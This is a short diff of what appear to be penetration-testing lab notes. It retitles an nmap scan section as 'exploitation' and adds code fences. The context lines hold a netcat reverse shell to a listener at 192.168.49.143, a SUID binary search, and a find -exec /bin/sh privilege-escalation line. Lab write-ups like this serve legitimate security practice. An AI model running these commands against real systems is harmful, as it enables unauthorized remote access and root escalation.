@@ -5,8 +5,9 @@
 # 25/1/2023
 
 ----------------------------------------------------
-# nmap result
+# nmap result / exploitation
 ----------------------------------------------------
+```
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
@@ -26,3 +27,4 @@ nc -nv 192.168.49.143 6969 -e /bin/bash
 
 find / -perm -u=s -type f 2>/dev/null
 find . -exec '/bin/sh' \;
+```
